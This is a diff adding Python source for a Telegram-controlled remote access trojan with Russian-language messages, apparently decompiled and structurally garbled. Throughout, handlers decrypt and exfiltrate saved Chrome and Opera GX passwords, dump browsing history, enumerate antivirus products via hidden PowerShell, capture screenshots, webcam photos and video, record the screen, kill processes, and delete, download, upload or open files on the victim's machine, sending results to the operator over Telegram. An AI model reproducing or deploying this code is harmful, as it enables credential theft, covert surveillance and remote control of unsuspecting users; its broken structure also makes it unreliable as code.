+                    shutil.copy2(db_path, temp_db.name)
+                    conn = sqlite3.connect(temp_db.name)
+                    cursor = conn.cursor()
+                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+                    login_data = cursor.fetchall()
+                    passwords = []
+                    for row in login_data:
+                        origin_url, username, encrypted_password = row
+                        decrypted_password = decrypt_password(encrypted_password, master_key)
+                        if decrypted_password:
+                            pass  # postinserted
+                except Exception as e:
+                    else:  # inserted
+                        passwords.append(f'Профиль: {profile}\nURL: {origin_url}\nЛогин: {username}\nПароль: {decrypted_password}\n')
+                    conn.close()
+                    if passwords:
+                        all_passwords.append('\n'.join(passwords))
+            else:  # inserted
+                return '\n\n'.join(all_passwords) if all_passwords else 'Пароли не найдены.'
+                logging.error(f'Ошибка при извлечении паролей из профиля {profile}: {e}')
+        chrome_passwords = get_chrome_passwords()
+        name = 'chrome.txt'
+        file_path = os.path.join(directory, name)
+        with open(file_path, 'w', encoding='utf-8') as file:
+            file.write(chrome_passwords)
+        try:
+            file_to_send = FSInputFile(file_path)
+            await message.answer_document(document=file_to_send, caption='🔑 Вот ваши пароли из Chrome!')
+        except Exception as e:
+                if os.path.exists(file_path):
+                    os.remove(file_path)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer(f'Ошибка при отправке файла: {e}')
+        if os.path.exists(file_path):
+            os.remove(file_path)
+
+@dp.message(F.text.lower() == 'пароли оперы gx')
+async def cmd_start(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        def get_opera_gx_path():
+            appdata_path = os.getenv('APPDATA')
+            opera_gx_path = os.path.join(appdata_path, 'Opera Software', 'Opera GX Stable')
+            if os.path.exists(opera_gx_path):
+                return opera_gx_path
+            return None
+
+        def get_master_key():
+            opera_gx_path = get_opera_gx_path()
+            if not opera_gx_path:
+                return
+            try:
+                with open(os.path.join(opera_gx_path, 'Local State'), 'r', encoding='utf-8') as file:
+                    pass  # postinserted
+            except Exception as e:
+                    local_state = file.read()
+                    local_state = json.loads(local_state)
+                        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+                        encrypted_key = encrypted_key[5:]
+                        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                        return master_key
+                    logging.error(f'Ошибка при получении ключа: {e}')
+
+        def decrypt_password(buff, master_key):
+            try:
+                iv = buff[3:15]
+                payload = buff[15:]
+                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                decrypted_pass = cipher.decrypt(payload)[:(-16)].decode()
+                return decrypted_pass
+            except Exception as e:
+                logging.error(f'Ошибка при расшифровке пароля: {e}')
+                return None
+            else:  # inserted
+                pass
+
+        def get_opera_gx_passwords():
+            opera_gx_path = get_opera_gx_path()
+            if not opera_gx_path:
+                return 'Opera GX не найден.'
+            db_path = os.path.join(opera_gx_path, 'Login Data')
+            if not os.path.exists(db_path):
+                return 'Файл с паролями не найден.'
+            all_passwords = []
+            master_key = get_master_key()
+            if not master_key:
+                return 'Не удалось получить ключ шифрования.'
+            try:
+                temp_db = tempfile.NamedTemporaryFile(delete=False)
+                shutil.copy2(db_path, temp_db.name)
+                conn = sqlite3.connect(temp_db.name)
+                cursor = conn.cursor()
+                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+                login_data = cursor.fetchall()
+                passwords = []
+                for row in login_data:
+                    origin_url, username, encrypted_password = row
+                    decrypted_password = decrypt_password(encrypted_password, master_key)
+                    if decrypted_password:
+                        passwords.append(f'URL: {origin_url}\nЛогин: {username}\nПароль: {decrypted_password}\n')
+                conn.close()
+                if passwords:
+                    all_passwords.append('\n'.join(passwords))
+            except Exception as e:
+                pass  # postinserted
+            else:  # inserted
+                return '\n\n'.join(all_passwords) if all_passwords else 'Пароли не найдены.'
+                logging.error(f'Ошибка при извлечении паролей: {e}')
+            else:  # inserted
+                pass
+        opera_gx_passwords = get_opera_gx_passwords()
+        name = 'opera_gx_passwords.txt'
+        file_path = os.path.join(directory, name)
+        with open(file_path, 'w', encoding='utf-8') as file:
+            file.write(opera_gx_passwords)
+        try:
+            file_to_send = FSInputFile(file_path)
+            await message.answer_document(document=file_to_send, caption='🔑 Вот ваши пароли из Opera GX!')
+        except Exception as e:
+                if os.path.exists(file_path):
+                    os.remove(file_path)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer(f'Ошибка при отправке файла: {e}')
+        if os.path.exists(file_path):
+            os.remove(file_path)
+
+@dp.message(F.text.lower() == 'история оперы gx')
+async def cmd_start(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        def get_opera_gx_history():
+            history_path = os.path.expandvars('%APPDATA%\\Opera Software\\Opera GX Stable\\History')
+            if not os.path.exists(history_path):
+                return (False, 'Файл истории Opera GX не найден. Возможно, браузер Opera GX не установлен.')
+            name = 'temp_opera_gx_history'
+            temp_history_path = os.path.join(directory, name)
+            shutil.copy2(history_path, temp_history_path)
+            conn = sqlite3.connect(temp_history_path)
+            cursor = conn.cursor()
+            query = '\n            SELECT urls.url, urls.title, urls.last_visit_time\n            FROM urls\n            ORDER BY last_visit_time DESC\n            '
+            cursor.execute(query)
+            rows = cursor.fetchall()
+            text_to_save = ''
+            for row in rows:
+                url = row[0]
+                title = row[1]
+                last_visit_time = row[2]
+                try:
+                    if last_visit_time > 0:
+                        last_visit_time = last_visit_time / 1000000 - 11644473600
+                        last_visit_time = datetime.datetime.fromtimestamp(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')
+                    else:  # inserted
+                        last_visit_time = 'Invalid time'
+                except (OSError, ValueError) as e:
+                    pass  # postinserted
+                else:  # inserted
+                    text_to_save += f'URL: {url}\nTitle: {title}\nLast Visit: {last_visit_time}\n\n'
+            else:  # inserted
+                if not text_to_save:
+                    os.remove(temp_history_path)
+                    return (False, 'История Opera GX пуста или не найдена.')
+                file_path = os.path.join(os.getcwd(), 'История_OperaGX.txt')
+                with open(file_path, 'w', encoding='utf-8') as file:
+                    file.write(text_to_save)
+                conn.close()
+                os.remove(temp_history_path)
+                return (True, file_path)
+                last_visit_time = f'Error: {str(e)}'
+        await message.answer('Получение истории Opera GX. Пожалуйста, подождите...')
+        success, result = get_opera_gx_history()
+        if not success:
+            await message.answer(result)
+            return
+        else:  # inserted
+            file_path = result
+            try:
+                file_to_send = FSInputFile(file_path)
+                await message.answer_document(document=file_to_send, caption='📂 История из Opera GX')
+            except Exception as e:
+                pass  # postinserted
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer(f'Ошибка при отправке файла: {e}')
+
+def get_antivirus_programs():
+    try:
+        result = subprocess.run(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', 'Get-CimInstance -Namespace \"root/SecurityCenter2\" -ClassName AntiVirusProduct | Select-Object -ExpandProperty displayName'], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        antivirus_programs = result.stdout.strip().split('\n')
+        return [program.strip() for program in antivirus_programs if program.strip()]
+    except subprocess.CalledProcessError as e:
+        return []
+    else:  # inserted
+        pass
+
+@dp.message(F.text.lower() == 'антивирус')
+async def cmd_start(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        antivirus_programs = get_antivirus_programs()
+        if antivirus_programs:
+            await message.answer('*Установленные антивирусные программы\\:*\n' + '\n'.join(antivirus_programs), parse_mode='MarkdownV2')
+        else:  # inserted
+            await message.answer('Антивирусные программы не найдены.')
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'скриншот')
+async def send_photo(message: types.Message):
+    if message.date < datetime.datetime.fromtimestamp(START_TIME, datetime.UTC):
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('Сейчас будет Сер')
+        screenshot = ImageGrab.grab()
+        filename = 'screenshot.png'
+        filepath = os.path.join(directory, filename)
+        screenshot.save(filepath)
+        photo = FSInputFile(filepath)
+        await message.answer_photo(photo)
+        if os.path.exists(filepath):
+            os.remove(filepath)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'фото с камеры')
+async def send_photo(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('Сыыыыр!')
+        filename = 'snapshot.png'
+        filepath = os.path.join(directory, filename)
+        try:
+            reader = imageio.get_reader('<video0>')
+            frame = reader.get_next_data()
+            if frame is None:
+                raise RuntimeError('Не удалось получить кадр с камеры.')
+            imageio.imwrite(filepath, frame)
+            photo = FSInputFile(filepath)
+            await message.answer_photo(photo, caption='Вот ваше фото с веб-камеры!')
+        except RuntimeError as e:
+            pass  # postinserted
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer(f'Произошла ошибка при попытке сделать фото: {e}')
+    except Exception as e:
+        await message.answer('Камера отсутствует или занята другим процессом.')
+
+@dp.message(F.text.lower() == 'процесы')
+async def cmd_start(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        process_info_list = []
+        for process in psutil.process_iter(['pid', 'name']):
+            process_info = f"PID: {process.info['pid']}, {process.info['name']}"
+            process_info_list.append(process_info)
+        all_processes_info = '\n'.join(process_info_list)
+        for i in range(0, len(all_processes_info), MAX_MESSAGE_LENGTH):
+            await message.answer(all_processes_info[i:i + MAX_MESSAGE_LENGTH])
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'полный отчет по процесам')
+async def cmd_start(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        process_info_list = []
+        for process in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info']):
+            process_info = f"PID: {process.info['pid']}, Name: {process.info['name']}, User: {process.info['username']}, CPU: {process.info['cpu_percent']}%, Memory: {process.info['memory_info'].rss / 1048576:.2f} MB"
+            process_info_list.append(process_info)
+        all_processes_info = '\n'.join(process_info_list)
+        for i in range(0, len(all_processes_info), MAX_MESSAGE_LENGTH):
+            await message.answer(all_processes_info[i:i + MAX_MESSAGE_LENGTH])
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'завершить процесс')
+async def cmd_andprocesses(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('Укажите PID процесса или его название.расширение для завершения.')
+        await state.set_state(WaitingForInput.waiting_for_pid)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_pid)
+async def process_pid(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        user_input = message.text
+        if not user_input.isdigit():
+            process_name = user_input
+            try:
+                result = subprocess.run(['taskkill', '/IM', process_name, '/F'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                if result.returncode == 0:
+                    await message.answer(f'Процесс \'{process_name}\' успешно завершён.')
+            except Exception as e:
+                else:  # inserted
+                    output = result.stdout + result.stderr
+                    if 'access is denied' in output.lower():
+                        await message.answer(f'Нет прав для завершения процесса \'{process_name}\'.')
+                    else:  # inserted
+                        if 'not found' in output.lower():
+                            await message.answer(f'Процесс \'{process_name}\' не найден.')
+                        else:  # inserted
+                            await message.answer(f'Не удалось завершить процесс \'{process_name}\'. Ошибка:\n{output}')
+                            else:  # inserted
+                                await state.clear()
+        else:  # inserted
+            pid = int(user_input)
+            try:
+                process = psutil.Process(pid)
+                process.terminate()
+                process.wait(timeout=3)
+                await message.answer(f'Процесс с PID {pid} успешно завершен.')
+            except psutil.NoSuchProcess:
+                pass  # postinserted
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer(f'Произошла ошибка: {e}')
+        await message.answer(f'Процесс с PID {pid} не найден.')
+    except psutil.AccessDenied:
+        await message.answer(f'Недостаточно прав для завершения процесса с PID {pid}.')
+    except psutil.TimeoutExpired:
+        await message.answer(f'Процесс с PID {pid} не завершился за отведенное время. Принудительное завершение.')
+        process.kill()
+        await message.answer(f'Процесс с PID {pid} принудительно завершен.')
+
+@dp.message(F.text.lower() == 'создать папку')
+async def create_folder_command(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('*Укажите путь где создать папку и вконце название папки\\, пример*\\:\n \'C:/Users/Public/Название\\_папки\'', parse_mode='MarkdownV2')
+        await state.set_state(WaitingForInput.waiting_for_new_folder_path)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_new_folder_path)
+async def process_folder_name(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        folder_name = message.text
+        if os.path.dirname(folder_name):
+            if not os.path.exists(folder_name):
+                os.makedirs(folder_name, exist_ok=True)
+                await message.answer(f'Папка \'{folder_name}\' успешно создана!')
+                await state.clear()
+            else:  # inserted
+                await message.answer(f'Папка с именем \'{folder_name}\' уже существует!')
+                await state.clear()
+        else:  # inserted
+            await message.answer('Пожалуйста, укажите полный путь к папке, а не только её название.')
+            await message.answer('Попробуйте снова. Перезапустив процесс.')
+            await state.clear()
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'удалить папку')
+async def delet_folder_command(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('*Укажите путь и вконце название папки\\, пример:*\n \'C:/Users/Public/Название\\_папки\'\n*\\!\\!\\!Папка удаляется со всем содержимым\\!\\!\\!*', parse_mode='MarkdownV2')
+        await state.set_state(WaitingForInput.waiting_for_folder_delete_path)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+incorrect_attempts = {}
+
+@dp.message(WaitingForInput.waiting_for_folder_delete_path)
+async def processdelet_folder_name(message: types.Message, state: FSMContext):
+    user_id = message.from_user.id
+    folder_name_delet = message.text
+    if user_id not in incorrect_attempts:
+        incorrect_attempts[user_id] = 0
+    if message.from_user.id in ALLOWED_USER_ID:
+        if os.path.exists(folder_name_delet) and os.path.isdir(folder_name_delet):
+            try:
+                shutil.rmtree(folder_name_delet)
+                await message.answer(f'Папка \'{folder_name_delet}\' и все её содержимое успешно удалены.')
+            except Exception as e:
+                    await state.set_state(None)
+        else:  # inserted
+            incorrect_attempts[user_id] += 1
+            if incorrect_attempts[user_id] >= 1:
+                await message.answer(f'Папка \'{folder_name_delet}\' не найдена. Пожалуйста, введите корректный путь к папке')
+                await message.answer('Попробуйте снова. Перезапустив процесс.')
+                await state.clear()
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer(f'Ошибка при удалении папки: {e}')
+        await state.set_state(None)
+        return
+
+@dp.message(F.text.lower() == 'скачать файл')
+async def send_file(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('Укажите путь и расширение файла, пример:\n C:/Users/Public/Название_файла.txt')
+        await state.set_state(WaitingForInput.waiting_for_download_file_path)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_download_file_path)
+async def process_send_file(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        directory_file = message.text
+        try:
+            if not os.path.isfile(directory_file):
+                await message.answer('Файл не найден. Проверьте путь и попробуйте снова.')
+        except Exception as e:
+                    await state.clear()
+            else:  # inserted
+                file_size = os.path.getsize(directory_file)
+                max_size = 52428800
+                if file_size > max_size:
+                    await message.answer(f'Файл слишком большой ({file_size / 1048576:.2f} MB). Максимальный размер файла - 50 MB.')
+                        await state.clear()
+                else:  # inserted
+                    document = FSInputFile(directory_file)
+                    await message.answer_document(document)
+                        await state.clear()
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer(f'Произошла ошибка: {e}\n')
+        await state.clear()
+        return None
+
+@dp.message(F.text.lower() == 'удалить файл')
+async def send_file(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('*Укажите путь и имя файла с его расширением\\, пример\\:*\n\'C:/Users/Public/Название\\_файла\\.txt\'', parse_mode='MarkdownV2')
+        await state.set_state(WaitingForInput.waiting_for_file_delete_path)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_file_delete_path)
+async def process_send_file(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        directory_file_delet = message.text
+        try:
+            if os.path.exists(directory_file_delet):
+                os.remove(directory_file_delet)
+                await message.answer(f'*Файл* \'{directory_file_delet}\' *успешно удален.*', parse_mode='Markdown')
+        except PermissionError:
+            else:  # inserted
+                await message.answer(f'*Файл* \'{directory_file_delet}\' *не был найден ❌*\nПожалуйста, проверьте правильность пути и имени файла, затем повторите попытку.', parse_mode='Markdown')
+                else:  # inserted
+                    await state.clear()
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer(f'*Ошибка:* Файл \'{directory_file_delet}\' *невозможно удалить,* так как он используется другим процессом ⚠️', parse_mode='Markdown')
+    except Exception as e:
+        await message.answer(f'*Произошла непредвиденная ошибка при удалении файла ❌*\n`{str(e)}`', parse_mode='Markdown')
+current_directory = 'C:/'
+
+@dp.message(F.text.lower() == 'содержание директории')
+async def show_directory_content(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        try:
+            files_and_dirs = os.listdir(current_directory)
+            folders = []
+            files = []
+            for item in files_and_dirs:
+                full_path = os.path.join(current_directory, item)
+                if os.path.isdir(full_path):
+                    folders.append(item)
+                else:  # inserted
+                    size = os.path.getsize(full_path)
+                    files.append(f'{item}  -  {size / 1048576:.2f} MB')
+            content = folders + files
+            content_text = '\n'.join(content) if content else 'Папка пуста'
+
+            def escape_md(text):
+                escape_chars = '_[]()~`>#+-=|{}.!'
+                return ''.join((f'\\{char}' if char in escape_chars else char for char in text))
+            safe_directory = escape_md(current_directory)
+            content_text = escape_md(content_text)
+            response = f'*Содержание директории* \'`{safe_directory}`\':\n\n{content_text}'
+        except Exception as e:
+            pass  # postinserted
+        else:  # inserted
+            await message.answer(response, parse_mode='MarkdownV2')
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        response = f'Ошибка: {escape_md(str(e))}'
+
+@dp.message(F.text == 'Переместиться по директории')
+async def change_directory(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    await message.answer('Введите путь к новой директории:')
+    await state.set_state(WaitingForInput.waiting_for_directory_path)
+
+@dp.message(WaitingForInput.waiting_for_directory_path)
+async def set_new_directory(message: types.Message, state: FSMContext):
+    global current_directory  # inserted
+    if message.from_user.id in ALLOWED_USER_ID:
+        new_directory = message.text
+        if os.path.isdir(new_directory):
+            current_directory = new_directory
+            await message.answer(f'*Успешно переместился, вот текущая директория:*\n\'`{current_directory}`\'', parse_mode='MarkdownV2')
+        else:  # inserted
+            await message.answer('Неверный путь. Попробуйте снов.')
+        await state.clear()
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+tasks = {}
+
+@dp.message(F.text.lower() == 'история хрома')
+async def cmd_start(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        def get_chrome_history():
+            history_path = os.path.expandvars('%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History')
+            if not os.path.exists(history_path):
+                return (False, 'Файл истории Chrome не найден. Возможно, браузер Chrome не установлен.')
+            temp_history_path = os.path.join(directory, 'temp_history')
+            shutil.copy2(history_path, temp_history_path)
+            conn = sqlite3.connect(temp_history_path)
+            cursor = conn.cursor()
+            query = '\n            SELECT urls.url, urls.title, urls.last_visit_time\n            FROM urls\n            ORDER BY last_visit_time DESC\n            '
+            cursor.execute(query)
+            rows = cursor.fetchall()
+            text_to_save = ''
+            for row in rows:
+                url = row[0]
+                title = row[1]
+                last_visit_time = row[2]
+                try:
+                    if last_visit_time > 0:
+                        last_visit_time = last_visit_time / 1000000 - 11644473600
+                        last_visit_time = datetime.datetime.fromtimestamp(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')
+                    else:  # inserted
+                        last_visit_time = 'Invalid time'
+                except (OSError, ValueError) as e:
+                    pass  # postinserted
+                else:  # inserted
+                    text_to_save += f'URL: {url}\nTitle: {title}\nLast Visit: {last_visit_time}\n\n'
+            else:  # inserted
+                file_path = os.path.join(directory, 'История_Хрома.txt')
+                with open(file_path, 'w', encoding='utf-8') as file:
+                    file.write(text_to_save)
+            conn.close()
+            os.remove(temp_history_path)
+            return (True, file_path)
+                last_visit_time = f'Error: {str(e)}'
+            else:  # inserted
+                pass
+        await message.answer('Получение истории Chrome. Пожалуйста, подождите...')
+        success, result = get_chrome_history()
+        if not success:
+            await message.answer(result)
+            return
+        else:  # inserted
+            file_path = result
+            try:
+                file_to_send = FSInputFile(file_path)
+                await message.answer_document(document=file_to_send, caption='📂 История Chrome')
+            except Exception as e:
+                pass  # postinserted
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer(f'Ошибка при отправке файла: {e}')
+
+@dp.message(F.text == 'Запись с веб камеры')
+async def web_record(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    await state.clear()
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('Укажите длительность записи в секундах')
+        await state.set_state(WaitingForInput.waiting_for_webcam_recording_duration)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_webcam_recording_duration)
+async def start_recording(message: types.Message, state: FSMContext):
+    global frames  # inserted
+    if message.from_user.id in ALLOWED_USER_ID:
+        user_input = message.text
+
+        async def is_number(value):
+            try:
+                float(value)
+                return True
+            except ValueError:
+                return False
+            else:  # inserted
+                pass
+
+        async def is_integer(value):
+            try:
+                int_value = int(value)
+                return True
+            except ValueError:
+                return False
+            else:  # inserted
+                pass
+        if await is_number(user_input):
+            if await is_integer(user_input):
+                break
+            await message.answer('Пожалуйста, введите целое число.')
+            await state.clear()
+            return
+        else:  # inserted
+            await message.answer('Пожалуйста, введите число.')
+            await state.clear()
+            return
+        try:
+            reader = imageio.get_reader('<video0>')
+            frame = reader.get_next_data()
+            if frame is not None:
+                pass
+            reader._close()
+            await state.clear()
+        except Exception as e:
+            else:  # inserted
+                sent_message = await message.answer('Начало записи...')
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer('Камера отсутствует или занята другим процессом.')
+        await state.clear()
+            """Функция записи видео"""  # inserted
+            writer = imageio.get_writer(VIDEO_FILENAME, fps=FPS)
+            reader = imageio.get_reader('<video0>')
+            frame_shape = reader.get_meta_data()['size']
+            width, height = frame_shape
+            for _ in range(DURATION * FPS):
+                try:
+                    frame = reader.get_next_data()
+                    frame = np.array(frame)
+                    frame_rgb = np.array(frame)
+                    writer.append_data(frame_rgb)
+                except StopIteration:
+                    pass  # postinserted
+                writer.close()
+                return True
+                break
+            else:  # inserted
+                pass
+
+@dp.message(F.text == 'Запись экрана')
+async def web_record(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    await state.clear()
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('Укажите длительность записи в секундах')
+        await state.set_state(WaitingForInput.waiting_for_screen_recording_duration)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_screen_recording_duration)
+async def start_recording(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        filename = os.path.join(directory, 'record.mp4')
+        user_input = message.text
+
+        async def is_number(value):
+            try:
+                float(value)
+                await state.clear()
+            except ValueError:
+                    return True
+                    await state.clear()
+                    return False
+
+        async def is_integer(value):
+            try:
+                int(value)
+                await state.clear()
+            except ValueError:
+                    return True
+                    await state.clear()
+                    return False
+        if not (await is_number(user_input) and await is_integer(user_input)):
+            await message.answer('Пожалуйста, введите целое число.')
+            await state.clear()
+            return
+            else:  # inserted
+                duration = int(user_input)
+                sent_message = await message.answer('Начало записи...')
+
+                def record_screen_sync(filename, duration):
+                    """Синхронная функция записи экрана"""  # inserted
+                    try:
+                        screen_size = pyautogui.size()
+                        writer = imageio.get_writer(filename, fps=20)
+                        start_time = time.time()
+                        while time.time() - start_time < duration:
+                            img = pyautogui.screenshot()
+                            frame = np.array(img)
+                            writer.append_data(frame)
+                        writer.close()
+                        return filename
+                    except Exception as e:
+                        print(f'Error recording screen: {e}')
+                        return None
+                    else:  # inserted
+                        pass
+
+                async def record_screen(filename, duration):
+                    """Асинхронная версия записи экрана с использованием потоков"""  # inserted
+                    loop = asyncio.get_event_loop()
+                    with ThreadPoolExecutor() as executor:
+                        return await loop.run_in_executor(executor, record_screen_sync, filename, duration)
+                recorded_filename = await record_screen(filename, duration)
+                if recorded_filename:
+                    await message.bot.edit_message_text('Запись завершена. \nОтправляю запись...', chat_id=message.chat.id, message_id=sent_message.message_id)
+                    file_to_send = FSInputFile(recorded_filename)
+                    await message.answer_video(file_to_send, caption='Вот запись с экрана!')
+                    os.remove(recorded_filename)
+                else:  # inserted
+                    await message.answer('Произошла ошибка при записи экрана.')
+                    try:
+                        os.remove(recorded_filename)
+                    except:
+                        pass
+            else:  # inserted
+                await state.clear()
+
+@dp.message(F.text.lower() == 'alt + f4')
+async def cmd_start(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        pyautogui.hotkey('alt', 'f4')
+        await message.answer('Окно было успешно закрыто✅')
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'свернуть все окна')
+async def cmd_start(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        KEYEVENTF_KEYDOWN = 0
+        KEYEVENTF_KEYUP = 2
+        VK_LWIN = 91
+        VK_D = 68
+        ctypes.windll.user32.keybd_event(VK_LWIN, 0, KEYEVENTF_KEYDOWN, 0)
+        ctypes.windll.user32.keybd_event(VK_D, 0, KEYEVENTF_KEYDOWN, 0)
+        time.sleep(0.1)
+        ctypes.windll.user32.keybd_event(VK_D, 0, KEYEVENTF_KEYUP, 0)
+        ctypes.windll.user32.keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0)
+        await message.answer('Окна были успешно свёрнуты✅')
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'открыть файл')
+async def cmd_start(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('*Укажите путь и имя файла с его расширением\\, пример\\:*\n\'C:/Users/Public/Название\\_файла\\.txt\'', parse_mode='MarkdownV2')
+        await state.set_state(WaitingForInput.waiting_for_file_open_path)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_file_open_path)
+async def web_record_send(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        directoryopn = message.text
+        if os.path.isfile(directoryopn):
+            try:
+                os.system(f'start \"\" \"{directoryopn}\"')
+                await message.answer('*Файл был успешно открыт ✅\\.*', parse_mode='MarkdownV2')
+            except Exception as e:
+                pass  # postinserted
+        else:  # inserted
+            await message.answer(f'*Файл* \'{directoryopn}\' *не был найден ❌* \nПожалуйста, проверьте правильность пути и имени файла\\, затем повторите попытку\\.', parse_mode='MarkdownV2')
+        await state.clear()
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer(f'Произошла ошибка при открытии файла: {e}')
+
+@dp.message(F.text.lower() == 'загрузить файл')
+async def handle_text_message(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.text.lower() == 'загрузить файл':
+        if message.from_user.id in ALLOWED_USER_ID:
+            await message.answer('Укажите путь, куда необходимо загрузить файл, пример:\n C:/Users/Public')
+            await state.set_state(WaitingForInput.waiting_for_file_upload_destination_path)
+        else:  # inserted
+            await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_file_upload_destination_path)
+async def set_new_directory(message: types.Message, state: FSMContext):
+    if message.from_user.id in ALLOWED_USER_ID:
+        directoryForSaveFiles = message.text
+        if not directoryForSaveFiles or not os.path.isdir(directoryForSaveFiles):
+            await message.answer('Не удалось найти директорию. Повторите попытку, перезапустив процесс.')
+            await state.clear()
+            return
+        else:  # inserted
+            await state.update_data(directoryForSaveFiles=directoryForSaveFiles, attempts=0)
